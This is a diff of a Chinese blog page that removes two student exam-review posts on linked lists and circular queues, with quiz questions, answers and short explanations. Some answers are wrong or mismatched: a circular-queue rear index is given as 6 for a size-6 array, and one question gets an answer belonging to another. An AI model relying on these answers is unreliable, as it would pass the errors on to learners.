-<p>答案应为<em>F</em>，链表存储地址并不是连续的，链表各个结点之间的联系是通过指针来实现的，指针指到的位置就算是链表的上下部分，但实际上指针具体指向哪个地址就是随意的了</p>
-<p><strong>将长度分别为m,n的两个单链表合并为一个单链表的时间复杂度为O(m+n)。 (1分)</strong></p>
-<p>答案应为<em>F</em>，这里因为自己也曾经和有序表的合并搞混过，所以把两种一块拿过来仔细说说</p>
-<ul>
-<li>普通单链表合并，只需要遍历第一个单链表找到结尾，把第二个单链表直接接上就完事了，<em>时间复杂度为o(n)</em></li>
-<li>有序合并并且合并后仍为有序，我们需要遍历两个链表，对data进行比较决定顺序，所以 <em>时间复杂度应该为o(n+m)</em></li>
-</ul>
-<p><strong>附加题目—将N条长度均为M的有序链表进行合并，合并以后的链表也保持有序，时间复杂度为()?</strong></p>
-<p>这应该说是上一个题目的难度up版，答案为o(n*m*logN)，至于具体过程我们在下面仔细</p>
-<ul>
-<li>取每个链表的第一个元素，组成一个数组，然后对数组进行排序，这是我们的第一步的时间复杂度<em>O(NlogN)</em></li>
-<li>将我们排序后数组的第一个节点视为新链表的第一个节点，将剩余链表的结点每次取一个用二叉搜索的方式插入数组，时间复杂度为<em>O(logN)</em></li>
-<li>重复上一步，因为第一步我们已经去除了m个结点，所以重复的次数应当是N*M-1 次，最终的时间复杂度应该是<em>O(NlogN) +  (M - 1) \</em> N * O(logN)= M * N* O(logN)*</li>
-</ul>
-<p><strong>(neuDS)单链表不是一种随机存取的存储结构。 (1分)</strong><br>答案应为<em>F</em>，这个很简单，可以理解为<em>能够通过地址的偏移直接得到相应位置的就是随机存储</em>，比如线性表，不能的就是非随机存储，比如单链表</p>
-<p><strong>设h为不带头结点的单向链表。在h的头上插入一个新结点t的语句是：</strong></p>
-<p>答案应为<em>t->next=h; h=t</em>;因为我们要在头部插入一个新的结点，那我们就需要<em>将新的头部指向原来的头部</em>，而新的单链表的h应该就变成了t，所以有了第二句</p>
-<p><strong>在单链表中，若p所指的结点不是最后结点，在p之后插入s所指结点，则执行</strong></p>
-<p>答案应为<em>s->next=p->next; p->next=s;</em>，因为要插入一个结点s，所以我们要做的第一件事就是把<em>插入前结点的信息先处理，防止信息丢失</em>，所以我们先让s的next指向了p的next，保留下了p的信息，之后让p的next指向s实现插入就ok了  </p>
-<p><strong>带头结点的单链表h为空的判定条件是：</strong></p>
-<p>答案应为<em>h->next == NULL;</em>，因为带头结点的单链表比普通的链表多了个“头”，所以我们的“头”之后才是真正的结点，所以没有结点的条件也就是h的next为NULL</p>
-<p><strong>将两个结点数都为N且都从小到大有序的单向链表合并成一个从小到大有序的单向链表，那么可能的最少比较次数是：</strong></p>
-<p>答案应为<em>N</em>，很简单，假设第一个链表的最大值比第二个链表的最小值小，那么比较的时候其实只<em>进行了第一个链表的N个元素和元素和第二个链表的第一个元素的比较的过程</em>，后面就不用再比较了，所以比较次数其实最小就是N</p>
-<p><strong>线性表若采用链式存储结构时，要求内存中可用存储单元的地址</strong></p>
-<p>答案为<em>连续或不连续都可以</em>，上面提过这个问题了，不啰嗦了</p>
-<p><strong>在具有N个结点的单链表中，实现下列哪个操作，其算法的时间复杂度是O(N)？</strong></p>
-<p>答案为<em>遍历链表和求链表的第i个结点</em>，很简单，不说了</p>
-<p><strong>对于一个具有N个结点的单链表，在给定值为x的结点后插入一个新结点的时间复杂度为 </strong></p>
-<p>答案为<em>O(N)</em>，很简单，我们需要首先遍历找到这个结点</p>
-<p><strong>链表具有的特点是：</strong></p>
-<ul>
-<li>插入、删除不需要移动元素</li>
-<li>不必事先估计存储空间</li>
-<li>所需空间与线性长度成正比</li>
-</ul>
-<p><strong>在一个含有n个结点的有序单链表中插入一个新结点，使单链表仍然保持有序的算法的时间复杂度是（ ）。</strong></p>
-<p>答案还是<em>O(n)</em>，也很简单，因为你还是要遍历单链表来找到你想要的位置</p>
-<p><strong>将长度为n的单链表连接在长度为m的单链表之后的算法的时间复杂度为（ ）。</strong></p>
-<p>答案是<em>O(m)</em>，上面也提过了，不说了</p>
-<p><strong>(neuDS)在单链表中，增加一个头结点的最终目的是为了( )。</strong></p>
-<p>说白了就是<em>方便运算</em>而已</p>
-<p><strong>在单链表中，要删除某一指定结点，必须先找到该结点的（）。</strong></p>
-<p>答案为<em>直接前驱</em>，很简单啊，还是之前提的思想，不管是加还是删，你得保证人家原来的信息都有，直接前驱可是保留着后继的信息的</p>
-<p><strong>以下关于链式存储结构的叙述中，（）是正确的。</strong></p>
-<ul>
-<li>结点除自身信息外还包括指针域，因此存储密度小于顺序存储结构</li>
-<li>逻辑上相邻的结点物理上不必邻接</li>
-<li>插入、删除运算操作方便，不必移动结点</li>
-</ul>
-<p><strong>线性链表具有的特点是（）。</strong></p>
-<ul>
-<li>不必事先估计所需存储空间大小</li>
-<li>插入与删除时不必移动元素</li>
-<li>所需空间与线性长度成正比</li>
-</ul>
-<p><strong>线性表若采用链式存储结构时，要求内存中可用存储单元的地址（）。</strong></p>
-<p>答案应为<em>经常需要进行插入和删除操作</em>，因为比起之后的元素都移动，不如遍历找到后简单的指针变化</p>
-<p><strong>线性表若采用链式存储结构时，要求内存中可用存储单元的地址（）。</strong></p>
-<p>答案是<em>连续或不连续都可以</em>，前面提过了</p>
-<p><strong>不带表头附加结点的单链表为空的判断条件是头指针head满足条件（）。</strong></p>
-<p>答案是<em>head==NULL</em>，之前说过带表头的，那不带表头的也就是第一个结点是头，那为空的条件也就是头为NULL呗</p>
-<p><strong>可以用带表头附加结点的链表表示线性表，也可以用不带头结点的链表表示线性表，前者最主要的好处是（）。</strong></p>
-<p>答案为<em>使空表和非空表的处理统一</em>，说白了就是方便</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/18/数据结构基础-队列/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Asa9ao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Asa9ao">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/18/数据结构基础-队列/" itemprop="url">数据结构基础--队列</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-18T20:32:37+08:00">
-                2018-11-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/数据结构/" itemprop="url" rel="index">
-                    <span itemprop="name">数据结构</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="数据结构复习—队列"><a href="#数据结构复习—队列" class="headerlink" title="数据结构复习—队列"></a>数据结构复习—队列</h2><p><strong> 1-1所谓“循环队列”是指用单向循环链表或者循环数组表示的队列。 (1分)</strong></p>
-<p>可以将向量空间想象成一个圆环，它首尾相接，这样的向量就是循环向量，如果我们的队列存储在这样的结构里我们就说是循环队列，当然在编程中我们可以用单链表或者是数组来表示它，但却不能划上等号</p>
-<p><strong>1-2在用数组表示的循环队列中，front值一定小于等于rear值。 (1分)</strong></p>
-<p>在循环队列中，front的值和rear的值有三种情况</p>
-<ul>
-<li>front的值小于rear的值<br><img src="https://upload-images.jianshu.io/upload_images/8219030-219fb91ec9d6ec4b.png?imageMogr2/auto-orient/" alt=""></li>
-<li>front的值等于rear的值<br><img src="https://upload-images.jianshu.io/upload_images/8219030-b177be6bcccd0238.png?imageMogr2/auto-orient/" alt=""></li>
-<li>front的值大于rear的值<br><img src="https://upload-images.jianshu.io/upload_images/8219030-756e097236623702.png?imageMogr2/auto-orient/" alt=""></li>
-</ul>
-<p><strong>1-3不论是入队列操作还是入栈操作,在顺序存储结构上都需要考虑”溢出”情况。 (2分)</strong></p>
-<p>这一点不用多说，在顺序存储结构中存储的容量是一定的，一定要考虑溢出的情况</p>
-<p><strong>2-1为解决计算机主机与打印机之间速度不匹配问题，通常设置一个打印数据缓冲区，主机将要输出的数据依次写入该缓冲区，而打印机则依次从该缓冲区中取出数据。该缓冲区的逻辑结构应该是？ (1分)</strong></p>
-<p>答案应为 <em>队列</em> ，由于打印机的缓冲区要做的是“先进来的先打印”这样一个操作逻辑，自然需要我们 <em>先进先出</em> 的队列来实现了</p>
-<p><strong>2-2若已知一队列用单向链表表示，该单向链表的当前状态（含3个对象）是：1->2->3，其中x->y表示x的下一节点是y。此时，如果将对象4入队，然后队列头的对象出队，则单向链表的状态是： (1分)</strong></p>
-<p>答案应为 <em>2->3->4</em> ，因为1是对头，3是队尾，当4入队后排在4后 变为队尾，1排队成功出队，2变为队头</p>
-<p><strong>2-3在一个链队列中，front和rear分别为头指针和尾指针，则插入一个结点s的操作为（ ）。 (2分)</strong></p>
-<p>答案应为 <em>rear->next=s;rear=s;</em> ，因为插入结点，所以rear的next应该是s，但s一旦入队s就变成了队尾，所以紧接着rear=s</p>
-<p>**2-4依次在初始为空的队列中插入元素a,b,c,d以后，紧接着做了两次删除操作，此时的队头元素是（ ）。 (2分)</p>
-<p>答案应为 <em>c</em> ，还是因为队列是 <em>先进先出</em> 的，所以a、b先进来，a、b先出去</p>
-<p><strong>2-5在一个不带头结点的非空链式队列中,假设f和r分别为队头和队尾指针,则插入s所指的结点运算是( )。 (2分)</strong></p>
-<p>答案应为 <em>r->next=s; r=s;</em> ，解析和第三题相同，在这里有没有头结点关系不大</p>
-<p><strong>2-6若用大小为6的数组来实现循环队列，且当前front和rear的值分别为0和4。当从队列中删除两个元素，再加入两个元素后，front和rear的值分别为多少？ (2分)</strong></p>
-<p>答案为 <em>2和6</em> ，当删除两个元素时，front+2，而当加入两个元素时，rear+2</p>
-<p>**2-7如果循环队列用大小为m的数组表示，且用队头指针front和队列元素个数size代替一般循环队列中的front和rear指针来表示队列的范围，那么这样的循环队列可以容纳的元素个数最多为： (2分)</p>
-<p>答案应为 <em>m</em> ，因为队列有m个时，一旦循环起来我们会遇到front和rear相等的情况，而我们没有办法判断到底是队列为空还是队列已满，根本原因是 <em>我们的队列有m+1种情况，而我们只有m种状态</em> ，所以我们可以用两种方法避免：</p>
-<ul>
-<li>size进行标记判断是否队列已满</li>
-<li>只保存m-1个值，那队列就只有m中状态，恰好可以表示完全</li>
-</ul>
-<p><strong>2-8如果循环队列用大小为m的数组表示，队头位置为front、队列元素个数为size，那么队尾元素位置rear为： (2分)</strong></p>
-<p>答案应为 <em>(front+size-1)%m</em> ，公式，很好想，背下来就好了</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -2338,7 +2245,7 @@ sh.interactive()
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-count">31</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2349,7 +2256,7 @@ sh.interactive()
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
